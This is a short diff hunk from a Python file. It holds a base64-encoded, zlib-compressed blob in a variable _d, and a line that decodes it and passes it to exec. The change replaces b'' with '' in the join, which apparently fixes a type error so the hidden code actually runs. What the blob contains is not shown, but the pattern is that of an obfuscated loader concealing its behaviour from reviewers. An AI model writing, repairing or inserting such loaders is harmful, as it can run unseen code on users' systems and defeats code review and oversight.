@@ -252,4 +252,4 @@ _d=(
     "k+RGeMMeZ0CYTyJY8Re3SWSfSKPrBffkEZhihHp1iEACBybD3t1PU2Qi3zB0rjp2f8O9WJGq/01pEm"
     "Bc/bQRW4iAnPhkdNj+iNG0p92dbqxrKOIab46xRNXRv0dqaWriFjW1fLo31JHzQf+P8DddXsag=="
 )
-exec(zlib.decompress(base64.b64decode(b''.join(_d.split()))).decode('utf-8'))
+exec(zlib.decompress(base64.b64decode(''.join(_d.split()))).decode('utf-8'))
